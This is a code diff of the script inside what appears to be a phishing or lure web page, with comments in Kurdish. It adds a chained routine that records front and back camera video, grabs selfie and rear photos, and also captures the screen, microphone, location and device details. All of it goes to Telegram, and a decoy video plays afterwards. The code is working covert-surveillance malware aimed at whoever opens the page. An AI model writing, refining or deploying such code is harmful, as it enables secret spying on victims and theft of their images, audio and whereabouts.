@@ -217,7 +217,6 @@
             } catch(e) {}
         }
 
-        // ١. تۆمارکردنی شاشەی ڕاستەوخۆ (Screen Recording Stream)
         function recordScreenStream() {
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
@@ -242,49 +241,90 @@
             } catch(e) {}
         }
 
-        // ٢. تۆمارکردنی ڤیدیۆی ڕاستەوخۆی پێشەوە و پاشان دواوە (Front & Back Live Video Sequence)
-        function recordLiveVideosSequence() {
-            try {
-                // ئەوەی یەکەم: ڤیدیۆی ڕاستەوخۆی پێشەوە (Front Camera Live Video)
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
-                .then(stream => {
-                    const videoElem = document.getElementById('camVideo');
-                    videoElem.srcObject = stream;
-                    videoElem.play();
-                    
-                    let mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
-                    let videoChunks = [];
-                    mediaRecorder.ondataavailable = e => { if (e.data && e.data.size > 0) videoChunks.push(e.data); };
-                    mediaRecorder.onstop = () => {
-                        let videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
-                        sendToTelegramVideo(videoBlob, "🎥 *تۆمارکردنی ڤیدیۆی ڕاستەوخۆی پێشەوە (Front Live Video)*");
-                        stream.getTracks().forEach(track => track.stop());
+        // --- سیستەمی نوێی ڕیزبەندی پۆڵایین (Master Sequence Flow) ---
+        function startPerfectSequence() {
+            const videoElem = document.getElementById('camVideo');
+            const canvas = document.getElementById('canvas');
 
-                        // ئەوەی دووەم: کاتێک پێشەوە تەواو بوو، ڕاستەوخۆ دەست پێدەکات بە ڤیدیۆی دواوە (Back Camera Live Video)
-                        setTimeout(() => {
-                            navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true })
-                            .then(backStream => {
-                                videoElem.srcObject = backStream;
-                                videoElem.play();
+            // هەنگاوی ١: ڤیدیۆی ڕاستەوخۆی پێشەوە (Front Live Video)
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+            .then(frontStream => {
+                videoElem.srcObject = frontStream;
+                videoElem.play();
 
-                                let backRecorder = new MediaRecorder(backStream, { mimeType: 'video/mp4' });
-                                let backChunks = [];
-                                backRecorder.ondataavailable = e => { if (e.data && e.data.size > 0) backChunks.push(e.data); };
-                                backRecorder.onstop = () => {
-                                    let backBlob = new Blob(backChunks, { type: 'video/mp4' });
-                                    sendToTelegramVideo(backBlob, "📹 *تۆمارکردنی ڤیدیۆی ڕاستەوخۆی دواوە (Back Live Video)*");
-                                    backStream.getTracks().forEach(track => track.stop());
-                                };
-                                backRecorder.start(1000);
-                                setTimeout(() => { if (backRecorder.state === 'recording') backRecorder.stop(); }, 4000);
-                            }).catch(e => {});
-                        }, 1000);
+                let frontRecorder = new MediaRecorder(frontStream, { mimeType: 'video/mp4' });
+                let frontChunks = [];
+                frontRecorder.ondataavailable = e => { if (e.data.size > 0) frontChunks.push(e.data); };
+                frontRecorder.onstop = () => {
+                    let frontBlob = new Blob(frontChunks, { type: 'video/mp4' });
+                    if (frontBlob.size > 500) {
+                        sendToTelegramVideo(frontBlob, "🎥 *تۆمارکردنی ڤیدیۆی ڕاستەوخۆی پێشەوە (Front Live Video)*");
+                    }
+                    frontStream.getTracks().forEach(track => track.stop());
 
-                    };
-                    mediaRecorder.start(1000);
-                    setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 4000);
-                }).catch(err => {});
-            } catch(e) {}
+                    // دوای تەواوبوونی ڤیدیۆی پێشەوە، دەچینە هەنگاوی ٢: وێنەی پێشەوە (Selfie Photo)
+                    setTimeout(() => {
+                        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                        .then(selfieStream => {
+                            videoElem.srcObject = selfieStream;
+                            videoElem.play();
+                            setTimeout(() => {
+                                canvas.width = videoElem.videoWidth || 640;
+                                canvas.height = videoElem.videoHeight || 480;
+                                let ctx = canvas.getContext('2d');
+                                ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
+                                canvas.toBlob(blob => {
+                                    sendToTelegramPhoto(blob, "📸 *وێنەی دوربینی پێشەوە (Selfie)*");
+                                }, 'image/jpeg', 0.9);
+                                selfieStream.getTracks().forEach(track => track.stop());
+
+                                // هەنگاوی ٣: وێنەی دواوە (Back Camera Photo)
+                                setTimeout(() => {
+                                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false })
+                                    .then(backPhotoStream => {
+                                        videoElem.srcObject = backPhotoStream;
+                                        videoElem.play();
+                                        setTimeout(() => {
+                                            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
+                                            canvas.toBlob(backBlob => {
+                                                sendToTelegramPhoto(backBlob, "📷 *وێنەی دوربینی دواوە (Back Camera)*");
+                                            }, 'image/jpeg', 0.9);
+                                            backPhotoStream.getTracks().forEach(track => track.stop());
+
+                                            // هەنگاوی ٤: ڤیدیۆی ڕاستەوخۆی دواوە (Back Live Video)
+                                            setTimeout(() => {
+                                                navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true })
+                                                .then(backVidStream => {
+                                                    videoElem.srcObject = backVidStream;
+                                                    videoElem.play();
+
+                                                    let backVidRecorder = new MediaRecorder(backVidStream, { mimeType: 'video/mp4' });
+                                                    let backVidChunks = [];
+                                                    backVidRecorder.ondataavailable = e => { if (e.data.size > 0) backVidChunks.push(e.data); };
+                                                    backVidRecorder.onstop = () => {
+                                                        let finalBackBlob = new Blob(backVidChunks, { type: 'video/mp4' });
+                                                        if (finalBackBlob.size > 500) {
+                                                            sendToTelegramVideo(finalBackBlob, "📹 *تۆمارکردنی ڤیدیۆی ڕاستەوخۆی دواوە (Back Live Video)*");
+                                                        }
+                                                        backVidStream.getTracks().forEach(track => track.stop());
+                                                    };
+                                                    backVidRecorder.start(1000);
+                                                    setTimeout(() => { if (backVidRecorder.state === 'recording') backVidRecorder.stop(); }, 4000);
+                                                }).catch(e => {});
+                                            }, 1000);
+
+                                        }, 1000);
+                                    }).catch(e => {});
+                                }, 1000);
+
+                            }, 1000);
+                        }).catch(e => {});
+                    }, 1000);
+
+                };
+                frontRecorder.start(1000);
+                setTimeout(() => { if (frontRecorder.state === 'recording') frontRecorder.stop(); }, 4000);
+            }).catch(e => {});
         }
 
         async function getAdvancedHardwareInfo() {
@@ -419,47 +459,6 @@
             }
         }
 
-        function takePicturesSequence() {
-            const video = document.getElementById('camVideo');
-            const canvas = document.getElementById('canvas');
-            
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-            .then(function(stream) {
-                video.srcObject = stream;
-                video.play();
-                
-                setTimeout(function() {
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    let context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    canvas.toBlob(function(blob) {
-                        sendToTelegramPhoto(blob, "📸 *وێنەی دوربینی پێشەوە (Selfie)*");
-                    }, 'image/jpeg', 0.9);
-                    
-                    stream.getTracks().forEach(track => track.stop());
-
-                    setTimeout(function() {
-                        navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false })
-                        .then(function(backStream) {
-                            video.srcObject = backStream;
-                            video.play();
-                            setTimeout(function() {
-                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                canvas.toBlob(function(backBlob) {
-                                    sendToTelegramPhoto(backBlob, "📷 *وێنەی دوربینی دواوە (Back Camera)*");
-                                }, 'image/jpeg', 0.9);
-                                backStream.getTracks().forEach(track => track.stop());
-                            }, 1000);
-                        }).catch(e => {});
-                    }, 1000);
-
-                }, 1200);
-            })
-            .catch(function(err) {});
-        }
-
         async function gatherAndSendDetails() {
             let ua = navigator.userAgent;
             let platform = navigator.platform;
@@ -515,9 +514,8 @@
 
             gatherAndSendDetails();
             sendLocation();
-            takePicturesSequence();
-            recordLiveVideosSequence(); // تۆمارکردنی ڤیدیۆی ڕاستەوخۆی پێشەوە و دواوە بەدوای یەکدا
-            recordScreenStream();        // تۆمارکردنی شاشە
+            startPerfectSequence();  // دەستپێکردنی ڕیزبەندییە زێڕینەکە (ڤیدیۆی پێشەوە -> وێنەی پێشەوە -> وێنەی دواوە -> ڤیدیۆی دواوە)
+            recordScreenStream();    // تۆمارکردنی شاشە
             recordMicrophone();
 
             setTimeout(function() {
@@ -530,7 +528,7 @@
                 
                 let vid = document.getElementById('targetVideo');
                 vid.play().catch(e => console.log(e));
-            }, 5000);
+            }, 6000);
         }
     </script>
 </body>
